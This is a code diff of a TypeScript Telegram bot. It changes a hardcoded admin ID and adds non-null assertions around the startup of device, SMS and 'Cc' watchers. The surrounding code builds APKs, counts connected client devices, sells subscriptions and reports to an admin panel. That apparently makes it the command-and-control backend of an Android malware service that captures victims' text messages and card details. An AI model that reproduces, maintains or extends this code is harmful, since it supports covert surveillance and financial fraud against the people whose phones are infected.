@@ -24,7 +24,7 @@ import { startDeviceWatcher } from "./deviceWatcher";
 import { startCcWatcher } from "./ccWatcher";
 
 const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
-const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5064888403");
+const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5741539104");
 
 function getPanelUrl(): string {
   const custom = process.env["PANEL_URL"];
@@ -234,7 +234,7 @@ export async function startBot(): Promise<void> {
       // Send actual error to admin so we can debug
       const errMsg = err?.message || String(err);
       try {
-        await bot.telegram.sendMessage(
+        await bot!.telegram.sendMessage(
           ADMIN_ID,
           `🔴 APK build error:\n\`${errMsg.slice(0, 500)}\``,
           { parse_mode: "Markdown" }
@@ -319,8 +319,6 @@ export async function startBot(): Promise<void> {
 
   bot.hears("📊 Stats", async (ctx) => {
     if (!isAdmin(ctx)) return;
-    ctx.command = "stats" as any;
-    // Re-trigger stats
     const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
     const deviceCount = clients ? Object.keys(clients).length : 0;
     const subCount = Object.keys(subs).length;
@@ -536,18 +534,18 @@ export async function startBot(): Promise<void> {
   // Launch bot first — only start watchers if THIS process owns the bot token.
   // If another process already claimed it (409), skip watchers to avoid duplicate alerts.
   bot.launch({ dropPendingUpdates: true }).then(() => {
-    startDeviceWatcher(bot, ADMIN_ID);
-    startSmsWatcher(bot, ADMIN_ID);
-    startCcWatcher(bot, ADMIN_ID);
+    startDeviceWatcher(bot!, ADMIN_ID);
+    startSmsWatcher(bot!, ADMIN_ID);
+    startCcWatcher(bot!, ADMIN_ID);
     logger.info("Watchers started — this process owns the bot");
   }).catch((err: any) => {
     if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
       logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
     } else {
       logger.error({ err }, "Bot launch error");
-      startDeviceWatcher(bot, ADMIN_ID);
-      startSmsWatcher(bot, ADMIN_ID);
-      startCcWatcher(bot, ADMIN_ID);
+      startDeviceWatcher(bot!, ADMIN_ID);
+      startSmsWatcher(bot!, ADMIN_ID);
+      startCcWatcher(bot!, ADMIN_ID);
     }
   });
   logger.info("Telegram bot started");
